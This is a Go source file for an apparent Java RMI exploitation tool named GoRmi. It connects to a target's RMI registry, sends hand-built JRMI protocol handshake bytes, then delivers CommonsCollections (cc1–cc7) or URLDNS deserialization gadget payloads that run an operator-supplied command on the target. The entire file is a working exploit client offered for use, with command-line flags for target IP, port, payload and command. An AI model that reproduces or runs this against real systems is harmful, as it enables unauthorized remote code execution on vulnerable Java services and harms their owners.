package main

import (
	"GoRmi/gadgets"
	"GoRmi/utils"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
)

const (
	version = "1.0"
	author  = "Firebasky&&atao"
)
func SendData(ip string,port string,exp []byte)  {

	conn, err := net.Dial("tcp",ip+":"+port)
	if err != nil {
		fmt.Printf("conn server failed, err:%v\n", err)
		return
	}
	//发送固定的值
	data1 := []byte{
		0x4a, 0x52, 0x4d, 0x49, 0x00, 0x02, 0x4b,
	}
	_, err = conn.Write(data1)
	if err != nil {
		fmt.Printf("send data1 failed, err:%v\n", err)
		return
	}

	var buf1 [1024]byte
	_, err = conn.Read(buf1[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}
	ipa :=[]byte(ip)
	aaa :=[]byte(string(len(ip)))
	toString := hex.EncodeToString(ipa)
	bbb := hex.EncodeToString(aaa)
	data:=("00"+bbb+toString+"00000000")
	data2, err := hex.DecodeString(data)
	_, err = conn.Write(data2)
	if err != nil {
		fmt.Printf("send data2 failed, err:%v\n", err)
		return
	}

	data3 := []byte{
		0x50, 0xac, 0xed, 0x00, 0x05, 0x77, 0x22,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x44, 0x15, 0x4d, 0xc9, 0xd4, 0xe6,
		0x3b, 0xdf,
	}
	_, err = conn.Write(data3)
	if err != nil {
		fmt.Printf("send data3 failed, err:%v\n", err)
		return
	}

	var buf2 [1024]byte
	_, err = conn.Read(buf2[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}

	data4 := []byte{
		0x52,
	}
	_, err = conn.Write(data4)
	if err != nil {
		fmt.Printf("send data4 failed, err:%v\n", err)
		return
	}

	var buf3 [1024]byte
	_, err = conn.Read(buf3[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}

	//最后发送exp 反序列化数据
	_, err = conn.Write(exp)
	if err != nil {
		fmt.Printf("send exp failed, err:%v\n", err)
		return
	}
}

func main() {
	utils.PrintLogo(version,author)
	var ip string
	var port string
	var payload string
	var command string
	var list bool
	var help bool
	flag.BoolVar(&help, "help", false, "")
	flag.StringVar(&ip, "ip", "", "vul ip")
	flag.StringVar(&port, "port", "", "vul port")
	flag.StringVar(&payload, "payload", "", "use which payload")
	flag.StringVar(&command, "cmd", "", "command")
	flag.BoolVar(&list, "list", false, "show payload list")
	flag.Parse()
	if help{
		fmt.Println("")
		fmt.Printf("%s\n","--ip 127.0.0.1")
		fmt.Printf("%s\n","--port 1099")
		fmt.Printf("%s\n","--payload cc6")
		fmt.Printf("%s\n","--cmd calc")
	}
	if list {
		utils.Info("payload list: ")
		all := gadgets.GetAllNames()
		for _, v := range all {
			fmt.Printf("\t%s\n", v)
		}
		return
	}
	if command == "" || payload == "" {
		//utils.Error("error input")
		return
	}
	fmt.Println("命令:",ip,port,payload,command)
	switch payload {
	case "cc1":
		utils.Info("get payload: %s", gadgets.CC1)
		bytePayload := gadgets.GetCommonsCollections1(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc2":
		utils.Info("get payload: %s", gadgets.CC2)
		bytePayload := gadgets.GetCommonsCollections2(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc3":
		utils.Info("get payload: %s", gadgets.CC3)
		bytePayload := gadgets.GetCommonsCollections3(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc4":
		utils.Info("get payload: %s", gadgets.CC4)
		bytePayload := gadgets.GetCommonsCollections4(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc5":
		utils.Info("get payload: %s", gadgets.CC5)
		bytePayload := gadgets.GetCommonsCollections5(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc6":
		utils.Info("get payload: %s", gadgets.CC6)
		bytePayload := gadgets.GetCommonsCollections6(command)
		SendData(ip,port,bytePayload)//发送exp
	case "cc7":
		utils.Info("get payload: %s", gadgets.CC7)
		bytePayload := gadgets.GetCommonsCollections7(command)
		SendData(ip,port,bytePayload)//发送exp
	case "urldns":
		utils.Info("get payload: %s", gadgets.URLDNS)
		bytePayload := gadgets.GetUrlDns(command)
		SendData(ip,port,bytePayload)//发送exp
	default:
		utils.Error("error payload")
		return
	}
}

